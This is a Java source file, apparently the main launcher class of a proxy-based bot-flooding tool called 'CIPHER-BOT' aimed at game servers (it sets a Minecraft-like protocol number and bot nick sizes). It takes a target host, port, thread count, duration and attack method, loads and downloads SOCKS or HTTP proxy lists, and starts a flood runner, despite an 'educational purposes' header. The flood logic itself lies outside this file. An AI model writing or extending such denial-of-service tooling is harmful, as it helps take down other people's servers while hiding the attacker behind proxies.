///Created by Daniel.Arvizu.Rosselli ///
// Free Use | No Licence //
// Made For Educational Purposes | Enjoy :D //
package me.kurumifake.zadkiel;

import java.net.Proxy;
import java.nio.ByteBuffer;
import java.util.Objects;
import me.kurumifake.zadkiel.flood.FloodRunner;
import me.kurumifake.zadkiel.helper.HTTPProxiesGetter;
import me.kurumifake.zadkiel.helper.ProxiesGetter;
import me.kurumifake.zadkiel.option.Options;
import me.kurumifake.zadkiel.proxy.Proxies;

public class Zadkiel {
    private final String version = "727";
    private final Options options;
    public static int protocol;
    public static int nickSizes;
    public static byte[] protocol_bytes;
    public Zadkiel(Options options) {
        this.options = options;
    }

    public void launch() {
    if (!this.options.isOption("host")) {
        System.out.println("\033[31mExample:");
        System.out.println("\033[32mjava -jar\033[35m CIPHER-BOT.jar\033[32m host=? port=? proxies=? threads=? time=? method=?");
            return;
        }
    String proxiesType = (String)this.options.getOption("proxiesType", "socks");
    String proxiesFile = (String)this.options.getOption("proxies", "proxies.txt");
    protocol = ((Integer)this.options.getOption("protocol", Integer.valueOf(47))).intValue();
    protocol_bytes = ByteBuffer.allocate(4).putInt(protocol).array();
    nickSizes = ((Integer)this.options.getOption("nickSizes", Integer.valueOf(16))).intValue();
    Proxies proxies = new Proxies();
    try {
        if (proxiesType.equals("socks")) {
            proxies.init(proxiesFile, Proxy.Type.SOCKS);
        } else if (proxiesType.equals("http")) {
            proxies.init(proxiesFile, Proxy.Type.HTTP);
        }
    } catch (Exception ex) {
        System.out.println("error finding proxies: proxies.txt");
        return;
    }

    ProxiesGetter.downloadFile(proxies);
    HTTPProxiesGetter.downloadFile(proxies);

    Objects.requireNonNull(this);
    System.out.println("started");
    (new FloodRunner(this.options, proxies)).run();
    }
}